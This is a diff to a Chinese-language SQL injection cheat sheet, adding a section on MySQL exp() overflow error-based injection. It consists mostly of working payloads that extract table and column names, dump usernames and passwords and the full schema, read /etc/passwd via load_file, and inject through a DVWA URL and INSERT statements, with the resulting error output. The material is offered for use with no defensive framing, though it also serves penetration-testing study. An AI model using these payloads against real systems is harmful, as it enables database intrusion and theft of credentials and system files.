@@ -78,8 +78,17 @@ ERROR 1060 (42S21): Duplicate column name 'Password'
 
 ## 数字溢出
 
-#### exp
+#### 参考
 
+- [乌云：使用exp进行SQL报错注入][1]
+- [基于BIGINT溢出错误的SQL注入][2]
+
+[1]: http://drops.wooyun.org/tips/8166
+[2]: http://drops.wooyun.org/web/8024
+
+#### exp --适用于MySQL5.5.5及以上版本
+
+#### 演示
 
 * select ~(select version());
 ```
@@ -96,3 +105,51 @@ mysql> select ~(select version());
 mysql> select exp(~(select * from(select user())x));
 ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
 ```
+
+#### 注出数据
+
+* 得到表名
+
+```
+select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+```
+
+* 得到列名
+
+```
+select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
+```
+
+* 检索数据
+
+```
+select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
+```
+
+* dump数据
+
+```
+exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
+
+http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&Submit=Submit#
+```
+
+* 读文件
+
+```
+select exp(~(select*from(select load_file('/etc/passwd'))a));
+```
+
+每次最多只能读 13 行
+
+#### insert update delete 都可以
+
+```
+mysql> insert into users (id, username, password) values (2, '' | exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)), 'Eyre');
+ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '000
+newdb::users::id
+newdb::users::username
+newdb::users::password' from dual)))'
+```
+
+
